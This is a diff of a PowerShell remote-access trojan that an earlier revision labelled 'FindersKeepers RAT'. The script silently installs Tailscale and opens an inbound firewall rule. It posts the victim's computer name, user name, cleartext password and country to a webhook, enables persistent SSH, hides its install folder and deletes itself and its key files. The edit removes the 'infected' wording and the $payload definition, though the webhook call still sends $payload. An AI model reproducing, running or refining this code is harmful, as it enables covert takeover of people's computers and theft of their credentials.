@@ -73,7 +73,7 @@ New-Item -Path $temp -Name $dirName -Type Directory
 Set-Location $dirName
 
 ## Install Tailscale and take ip
-installTailscale -authKey $authKey -path $temp/$dirName 
+installTailscale -path $temp/$dirName 
 Set-Location $PSScriptRoot
 netsh advfirewall firewall add rule name="Tailscale Service"  dir=in action=allow program="C:\Tailscale\tailscaled.exe" enable=yes
 Start-Sleep 5
@@ -88,7 +88,7 @@ Start-Sleep 1
 $ip = (Get-NetIPAddress -AddressFamily IPv4 -AddressState Preferred -InterfaceAlias "Tailscale").IPAddress 
 
 $description = @"
-New Computer infected 
+New Computer 
 ---------------------------------
 Computer Name = $env:computername 
 User Name = $env:username
@@ -97,11 +97,6 @@ Account Password = $pwordClear
 Temp Directory = $dirName
 Location (country) = $country
 "@
-New-Item ./$env:computername.fk -Value ( " " + $ip," " + $pwordClear,"C:/Users/$uName","Ignore this file if you aren't familiar with Network Statistics" -join [Environment]::NewLine + [Environment]::NewLine )
-$payload = @{
-  'username' = 'FindersKeepers RAT'
-  'content'  = $description
-}
 Invoke-RestMethod -Uri $Webhook -Method Post -Body $payload;
 
 ## Enable persistent SSH
@@ -110,14 +105,13 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
-## Self Delete
-Remove-Item "C:/file.msi"
-Remove-Item $temp/$dirName/"file.msi"
-Remove-Item "$PSScriptRoot/$env:computername.fk" 
-Remove-Item "$PSScriptRoot/webhook"
-Remove-Item "$PSScriptRoot/authkey"
-Remove-Item $PSCommandPath -Force 
-
 ## Finish Tailscale installation
 Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
 taskkill /im "tailscale-ipn.exe" /F
+
+## Self Delete
+Remove-Item "C:/file.msi"
+Remove-Item $temp/$dirName/"file.msi"
+Remove-Item "$PSScriptRoot/webhook"
+Remove-Item "$PSScriptRoot/authkey"
+Remove-Item $PSCommandPath -Force 
